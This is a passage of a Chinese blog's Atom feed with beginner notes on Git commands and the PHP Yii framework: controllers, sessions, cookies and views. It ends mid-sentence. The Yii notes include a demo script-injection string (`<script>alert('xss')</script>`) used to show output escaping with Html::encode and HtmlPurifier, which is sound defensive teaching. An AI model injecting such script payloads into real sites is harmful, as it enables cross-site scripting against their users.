<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0verWatch&#39;s Blog</title>
  
  <subtitle>学习本无底，前进莫彷徨</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="0verwatch.top/"/>
  <updated>2018-05-20T09:32:00.189Z</updated>
  <id>0verwatch.top/</id>
  
  <author>
    <name>0verWatch&#39;s Blog</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Git学习笔记</title>
    <link href="0verwatch.top/2018/04/18/git-learning/"/>
    <id>0verwatch.top/2018/04/18/git-learning/</id>
    <published>2018-04-18T09:29:15.000Z</published>
    <updated>2018-05-20T09:32:00.189Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>   为了做项目，没办法得学一下Git</p><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>因为为我是在Windows下运行的所以直接下载安装包安装，安装后右键打开Git-&gt;bash</p><p>在命令行里面输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure><p>因为分布式版本控制系统下每个机器都必须自报家门</p><p><code>注意</code>git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，</p><h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><p>在git-bash里面进入到放你项目的文件夹直接一条<code>git init</code>命令即可<br>这里会产生一个<code>.git</code>的隐藏文件，这里想起了CTF里面可能出现的<code>.git</code>源码泄露的题目，注意一下</p><p>把文件存储在版本库<br>两个步骤<br>第一步，使用命令<code>git add &lt;file&gt;</code>，注意，可反复多次使用，添加多个文件；</p><p>第二步，使用命令<code>git commit</code>，完成。<br>下面是一个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add file1.txt</span><br><span class="line">$ git add file2.txt file3.txt</span><br><span class="line">$ git commit -m &quot;add 3 files.&quot;</span><br></pre></td></tr></table></figure><p>提交到版本库后，<br>我们可以用下面的命令去查看状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>还有另外一条命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff + 具体被修改的文件</span><br></pre></td></tr></table></figure><p>可以查看修改内容<br><code>git log</code>命令查看当前版本库的状态<br>如果嫌输出信息太多，看得眼花缭乱的，可以试试加上<code>--pretty=oneline</code> 这样他就会输出各次修改的<code>commit id（版本号）</code></p><p>Git还提供了一个命令<code>git reflog</code>用来记录你的每一次命令,我们一般用这个去找回误删的步骤</p><h2 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h2><p>在Git中，用HEAD表示当前版本，也就是最新的提交commit id，上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个^比较容易数不过来，所以写成<code>HEAD~100</code><br>回退的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure><p>也可以这样去做<br><code>git reset --hard commit_id</code> 这里的commit_id可以不写完</p><h2 id="删除与恢复文件"><a href="#删除与恢复文件" class="headerlink" title="删除与恢复文件"></a>删除与恢复文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm + 文件名</span><br></pre></td></tr></table></figure><p>用于删除一个文件。如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失最近一次提交后你修改的内容。<br><code>git checkout -- file</code>可以丢弃工作区的修改，就是让这个文件回到最近一次git commit或git add时的状态。</p><hr><p>下面的步骤有点体现分布式特点了</p><h2 id="添加远程库"><a href="#添加远程库" class="headerlink" title="添加远程库"></a>添加远程库</h2><p>点击Create a new repository进入页面<br>自己新建个项目就好了<br><a href="https://imgchr.com/i/CgB48H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgB48H.md.png" alt="CgB48H.md.png"></a></p><p>要关联一个远程库，使用命令<code>git remote add origin git@server-name:path/repo-name.git</code><br>这部分后面的东西可以在你的项目中寻找,<br>这里还关系到https还有ssl，使用https除了速度慢以外，还有个最大的麻烦是每次推送都必须输入口令，但是在某些只开放<br>http端口的公司内部就无法使用ssh协议而只能用https。<br>关联后，使用命令<code>git push -u origin master</code><strong>第一次</strong>推送master分支的所有内容；</p><p>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改</p><h2 id="从远程库克隆"><a href="#从远程库克隆" class="headerlink" title="从远程库克隆"></a>从远程库克隆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@server-name:path/repo-name.git</span><br></pre></td></tr></table></figure><p>后面的内容跟关联很相似</p><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><p>分支的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看分支：git branch</span><br><span class="line"></span><br><span class="line">创建分支：git branch &lt;name&gt;</span><br><span class="line"></span><br><span class="line">切换分支：git checkout &lt;name&gt;</span><br><span class="line"></span><br><span class="line">创建+切换分支：git checkout -b &lt;name&gt;</span><br><span class="line"></span><br><span class="line">合并某分支到当前分支：git merge &lt;name&gt;</span><br><span class="line"></span><br><span class="line">删除分支：git branch -d &lt;name&gt;</span><br></pre></td></tr></table></figure><h2 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h2><p>推送分支，就是把该分支上的所有本地提交推送到远程库。推送时，要指定本地分支，这样，Git就会把该分支推送到远程库对应的远程分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure></p><p>推送其他分支，比如dev，就改成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin dev</span><br></pre></td></tr></table></figure><p>自我感觉现在就这几部分对我的项目有帮助，先记下来，还有些内容等以后学习吧 </p><p>参考网站<br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000</a><br><a href="https://www.cnblogs.com/schaepher/p/4933873.html" target="_blank" rel="noopener">https://www.cnblogs.com/schaepher/p/4933873.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;   为了做项目，没办法得学一下Git&lt;/p&gt;
    
    </summary>
    
      <category term="Git" scheme="0verwatch.top/categories/Git/"/>
    
    
      <category term="Git" scheme="0verwatch.top/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>PHP_Yii框架学习笔记</title>
    <link href="0verwatch.top/2018/04/11/PHP-Yii/"/>
    <id>0verwatch.top/2018/04/11/PHP-Yii/</id>
    <published>2018-04-11T14:53:22.000Z</published>
    <updated>2018-05-20T06:35:21.781Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  最近准备要基于Yii框架写一个项目，于是准备自学一波，这里记录一下自己的笔记</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Yii框架的搭建"><a href="#Yii框架的搭建" class="headerlink" title="Yii框架的搭建"></a>Yii框架的搭建</h3><p>首先我用的是phpstudy环境下搭建Yii框架，注意这里一定要用PHP5.4以上的版本，我们可以通过Yii框架目录下的requirements.php查看我们还差一些什么条件之类的。<br><img src="http://img-blog.csdn.net/20180411225051668?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>搭建框架我这里用了两种方法去安装</p><p>第一种直接官网上下载源码，解压后放到phpstudy的网站根目录下面，不过这种办法要自己手动设置cookie，这个文件在config目录下的web.php文件，这里最好设置到自己都不认得最好<br><img src="http://img-blog.csdn.net/20180411225010453?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>也就是上图的红标的地方</p><p>第二种就是通过composer安装，这种方法就不用设置cookie，但这个方法下载的有点慢，而且安装过程中还会出现一系列毛病。。特别是关于那个SSL/TLS的设置，最后我是在php-ini里面把相关配置给弄好，而且在phpstudy里面把php-openssl打开才解决的，<br>但是最后命令航还是有这样的一句话<br><img src="http://img-blog.csdn.net/20180411225101800?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>但好像对整体没啥影响。。。</p><p>上面的配置弄好以后可以在浏览器中打开web目录下的index.php，如果出现以下界面表明安装成功。<br><img src="http://img-blog.csdn.net/20180411225111784?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>为什么要提出命名空间概念，这是因为在文件包含的时候如果两个文件拥有相同的类的话，会出现下面的报错，这时候命名空间就会起到至关重要的作用了<br><img src="http://img-blog.csdn.net/2018041422214536?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>解决办法就是在任意包含的一个文件里面改变命名空间，用<code>using</code>语句，就像下图<br><img src="http://img-blog.csdn.net/20180414222201418?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>我们在index页面可以这样去创建一个类，结果如下 </p><p><img src="http://img-blog.csdn.net/20180414222220772?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>但是出现多个一样的类，机会显得冗余<br>于是我们可以这样做，同时我们还可以利用<code>as</code>去重命名类，这符合多个相同的类的文件包含的情况</p><p><img src="http://img-blog.csdn.net/20180414222232297?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>在命名空间里面我们要注意的是如果不加using语句的话，默认是在一个全局命名空间里面，我们在用use语句是应该是这样的，千万要注意<code>\</code><br><img src="http://img-blog.csdn.net/20180414222334561?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p>一般控制器的文件是放在<code>controllers</code>目录下面的<br>一般命名的格式为<code>name+Controller</code>，以<code>Controller</code>这个单词结束<br>而在对应的文件里面的类我们也应该同名(因为我们所说的控制器大部分都是一个类，而且规定得放在一个命名空间里面)<br>而且定义的类必须的再继承控制器这一个类，所以<code>extends</code>后面的东西不能少</p><p>但是<code>extends</code>后面的<code>Controller</code>也是一个类，也有自己的命名空间，于是我们还得加上<code>use yii\web\Controller</code>;<br>里面的操作必须以<code>action</code>开头加上名字</p><p><img src="http://img-blog.csdn.net/20180414222611694?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>我们如何来引用这个操作，我们就要在入口脚本里面加上<code>r=hello/index</code>,其中hello是指hello控制器，index是指hello控制器下的index的操作<br><img src="http://img-blog.csdn.net/20180414222647614?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h3 id="控制器请求处理"><a href="#控制器请求处理" class="headerlink" title="控制器请求处理"></a>控制器请求处理</h3><p>控制器下传参的话一般我们可以调用一个全局的类YII，以这样的url为例子说明在代码里面是如何执行的，这个url表明了现在的操作是hello控制器下的index操作的传参操作<br><img src="http://img-blog.csdn.net/20180414222750782?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>我们首先要调用全局类Yii下的静态变量$app，也就是应用主体里面的request方法<br>记得不要忘记<code>$request = \Yii::$app-&gt;request</code>中的\缺了就可能报错，虽然官方文档没加，但是尝试过后发现还是要加上的，所以说前面为什么在命名空间里面提及要全局类前面加上<code>\</code></p><p>对于get传参我们可以这样去利用<br><code>$request-&gt;get(&#39;id&#39;,20)</code>，第一个参数是get方式请求的名字，第二个是传参返回的默认值，还有post传参也是这样的操作</p><p>还有一个常用的方法就是判断他是post方法还是get方法<br><code>$request-&gt;isGet</code>,如下图<br><img src="http://img-blog.csdn.net/2018041422284739?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p><img src="http://img-blog.csdn.net/20180414223005851?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>同样的Post也一样，举一反三而已<br>我们还能获取ip地址例如<code>$request-&gt;userIp</code></p><p>更多的方法还可以去查官方手册</p><h3 id="控制器响应"><a href="#控制器响应" class="headerlink" title="控制器响应"></a>控制器响应</h3><p>关于控制器的响应，我们可以利用这个东西去进行多个操作<br>首先这一个东西也需要调用全局类Yii下的静态变量$app，也就是应用主体里面的<code>response</code>方法</p><p>假定前提条件是<code>$res=\YII::$app-&gt;response</code><br>我们可以利用他来改变返回的状态码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;statusCode = &apos;404&apos;;  //默认是200</span><br></pre></td></tr></table></figure><p>我们还可以用来改变header的一些属性<br><code>$res-&gt;headers-&gt;add(&#39;pogram&#39;,&#39;1234556&#39;);</code>给头部增加属性</p><p>还能设置跟删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;headers-&gt;set(&apos;pogram&apos;,&apos;123456&apos;);</span><br><span class="line">$res-&gt;headers-&gt;remove(&apos;program&apos;);</span><br></pre></td></tr></table></figure><p>还有跳转功能<br><code>$res-&gt;headers-&gt;add(&#39;location&#39;,&#39;http://www.baidu.com&#39;);</code>  但是这一句话好像没什么反应。。官方手册我也没找到。。莫非被抛弃了？</p><p>但是由于这个功能比较常用，所以直接封装在Controller里面，这就有了第二种写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;redirect(&apos;http://www.baidu.com&apos;,302); //这里的第二个参数是状态码</span><br></pre></td></tr></table></figure><p>文件下载功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;headers-&gt;add(&apos;content-disposition&apos;,&apos;attachment;filename=&quot;a.jpg&quot;&apos;);  这里的文件名自定义，但总觉得记着里面的参数有点困难</span><br></pre></td></tr></table></figure><p>同样的因为常用而有一个更直接的<code>send</code>方法<br><code>$res-&gt;sendFile(&quot;./robots.txt&quot;);</code>注意这里的文件是存在于web目录下也就是当前目录下的的文件</p><p>这一部分参考文档也很详细，我就选几个重要的来学习一下。。。</p><h3 id="Session处理"><a href="#Session处理" class="headerlink" title="Session处理"></a>Session处理</h3><p>同样的这也是在全局类Yii下的应用主体app下的session方法<br>以<code>$session = \YII::$app-&gt;session;</code>为例<br>判断是否设置了session用一个方法isActive方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($session-&gt;isAcive)</span><br></pre></td></tr></table></figure><p>而打开session我们可以用open()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;open()</span><br></pre></td></tr></table></figure><p>这里列举一下session的增删改查</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;set(<span class="string">'user'</span>,<span class="string">'abcde'</span>); <span class="comment">//增设一条session数据，我们可以看到在PHPstudy里面的tmp目录下多了一条session数据</span></span><br></pre></td></tr></table></figure><p><img src="http://img-blog.csdn.net/20180416222438755?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>如果想获取这一条session里面的数据的话<br>我们可以这样去调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;get(<span class="string">'user'</span>);<span class="comment">//在编译器里面echo一波他就会出现</span></span><br></pre></td></tr></table></figure><p><img src="http://img-blog.csdn.net/20180416222613438?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>如果删除的话，我们可以这样去实现</p><p><code>$session-&gt;remove(&#39;user&#39;);</code><br><img src="http://img-blog.csdn.net/20180416222846884?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>当然上面的办法是通过Yii框架里面的类去实现的，我们还可以利用数组方式去设置，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$session[<span class="string">'user'</span>]=<span class="string">'abcde'</span>;</span><br><span class="line"><span class="keyword">echo</span> $session[<span class="string">'user'</span>];</span><br><span class="line"><span class="keyword">unset</span> ($session[<span class="string">'user'</span>]);</span><br></pre></td></tr></table></figure><p><code>注意</code><br>如果我们在其他浏览器echo一下session的话，他是不会出现任何东西的，原因是他会识别session里面的文件名，进而把里面的内容拿出来，好像是不同的浏览器产生的session的文件名不一样。。</p><h3 id="Cookie处理"><a href="#Cookie处理" class="headerlink" title="Cookie处理"></a>Cookie处理</h3><p>从<code>响应</code>里面获取数据并往浏览器里面写入cookie数据，我们可以利用下面的语句<br>首先我们得从全局类Yii下的应用主体app下的response获取对应的cookies方法<br>也就是<code>/YII::$app-&gt;response-&gt;cookies</code>;</p><p>我们添加一个cookies信息,可以这样去写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookies = \YII::$app-&gt;response-&gt;cookies;</span><br><span class="line">$cookie_data = <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;<span class="string">'user'</span>,<span class="string">'value'</span>=&gt;<span class="string">'1232123'</span>);</span><br><span class="line">$cookies-&gt;add(<span class="keyword">new</span> Cookie($cookie_data));  <span class="comment">//注意这里add参数里面是一个Cookie对象，引用这样的对象我们需要在代码</span></span><br></pre></td></tr></table></figure><p><img src="http://img-blog.csdn.net/20180416222829262?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>的前面使用一个命名空间<code>use yii\web\Cookie;</code><br>如果我们要修改某一个cookie的值的话，直接改变value的值即可，他会自动覆盖掉原来的数据<br>删除的话我们就可以直接用<code>$cookies-&gt;remove(&#39;id&#39;); //里面是cookie的名字</code></p><p>从<code>请求</code>里面拿出cookie数据，我们这个时候使用的是app下的request对应的cookies方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookies = \YII::$app-&gt;request-&gt;cookies;</span><br><span class="line">$cookies-&gt;getValue(<span class="string">'user'</span>);</span><br></pre></td></tr></table></figure><p>但如果上面的cookie不存在的话，他会返回第二个默认的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cookie-&gt;getValue(&apos;users&apos;,24);</span><br></pre></td></tr></table></figure><p><img src="http://img-blog.csdn.net/2018041622290998?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>cookie这东西为什么在浏览器里面看来是一串混乱的数字呢，是因为它用了我们上面总结的在config目录下的web.php文件里面的cookiekey加密的</p><h3 id="视图的创建"><a href="#视图的创建" class="headerlink" title="视图的创建"></a>视图的创建</h3><p>过多的html或者js会给我们带来冗余的代码，这里就涉及到Yii框架给我们带来的一套解决方案，就是把一些前端代码放在一个叫views的文件夹下</p><p>我这里是在views文件夹下新建了一个hello文件夹对应上面的hello控制器，而且这个文件夹下存在一个名为index.php的文件，里面存有HTML格式<br><img src="http://img-blog.csdn.net/20180416223108903?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>一般我们把里面的文件称为视图文件,而Yii框架规定了我们需要在对应控制器名字的文件夹下寻找对应的文件(文件夹不区分大写小好像)</p><p> <img src="http://img-blog.csdn.net/20180416223136930?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>我们在对应的控制器文件里面需要调用renderPartial函数，但是由于这个数属于Controller类，所以我们直接调用<br><code>return $this-&gt;renderPartial(&#39;views下对应的文件名/*为了方便管理Yii框架规定不要后缀名*/&#39;);</code><br>而且这里的return也是是Yii框架规定的，调用视图只能够这样写了</p><h3 id="视图传送数据"><a href="#视图传送数据" class="headerlink" title="视图传送数据"></a>视图传送数据</h3><p>我们可以通过数组去传递视图要的数据，主要步骤是先创建一个数组，再利用数组里面的key和value<br>然后再利用renderPartial函数的第二个参数去传参<br>这里是controller页面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$hello_str= <span class="string">'Hello World'</span>;</span><br><span class="line">        $test_array = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//创建数组</span></span><br><span class="line">        $data = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把需要传给视图的值放进数组中</span></span><br><span class="line">        $data[<span class="string">'view_hellostr'</span>]=$hello_str;</span><br><span class="line">        $data[<span class="string">'view_array'</span>]=$test_array;</span><br><span class="line">        <span class="keyword">return</span>  <span class="keyword">$this</span>-&gt;renderPartial(<span class="string">'index'</span>,$data);</span><br></pre></td></tr></table></figure><p>在view下的hello/index.php下的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_hellostr<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_array[<span class="number">0</span>]<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们是利用了controller里面数组的键值作为这一个页面输出的变量，记得带$符号，我好几次都忘记了，还有的话数组记得加下标，不然会报错的</p><p>另外补充一个知识点</p><p>这里的利用了php的短标签<br>在php的配置文件（php.ini）中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code><br>同时，只有开启这个才可以使用 <code>&lt;?=</code> 以代替 <code>&lt;? echo</code> ，=表示输出，不过建议用<code>&lt;?php ?&gt;</code></p><h3 id="视图数据的安全"><a href="#视图数据的安全" class="headerlink" title="视图数据的安全"></a>视图数据的安全</h3><p>这里涉及到一个xss安全问题，学习视频发现这里应该是反射型xss，主要原因是过滤不严谨导致的。。复习一波安全知识<br>下面就是如何来防御的<br>我们把上面代码的变量<code>$hello_str= &#39;Hello World&#39;;</code>改为<code>$hello_str= &#39;Hello World&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&#39;;</code><br>这是一个弹窗代码，如果用户输入的是这样的，那就会直接弹窗，体验会很差<br>解决的办法有两个，一个是编码一下，再输出，另一种是直接过滤掉js代码<br>我们只需要在view页面下的hello/index.php下的代码做修改，但是我们需要提前使用它们的命名空间，所以前面加上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">Html</span>;     <span class="comment">//第一种方法的命名空间</span></span><br><span class="line"> <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">HtmlPurifier</span>;   <span class="comment">//第二种方法的命名空间</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?</span>=Html::encode($view_hellostr)<span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?</span>=HtmlPurifier::process($view_hellostr)<span class="meta">?&gt;</span>&lt;/h1&gt;  <span class="comment">//利用了process的方法</span></span><br></pre></td></tr></table></figure><p>页面显示结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World&lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure><h3 id="布局文件"><a href="#布局文件" class="headerlink" title="布局文件"></a>布局文件</h3><p>有时候多个HTML文件会出现冗余的部分，程序员不希望出现这种情况<br>于是我们就出现了布局文件把冗余的部分放在一个文件下方便调用</p><p>一般我们会在views下面的layouts文件夹新建布局文件<br>这里我在layouts文件夹下创建了一个名叫common.php的文件</p><p>把公共部分的代码放在common文件下</p><p>回到controller的文件下，这时候我们不能再使用<code>renderPartial</code>这个函数了，应该用<code>render</code>这个函数，也就是该为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'index'</span>);  <span class="comment">//这里的代码的作用是先把index视图里面的内容放到一个叫$content的变量里面，而且会把布局文件里面的内容显示出来</span></span><br></pre></td></tr></table></figure><p>但同时我们也要指定布局文件，所以我们要对应的类下面而不是控制器里面去定义<code>public 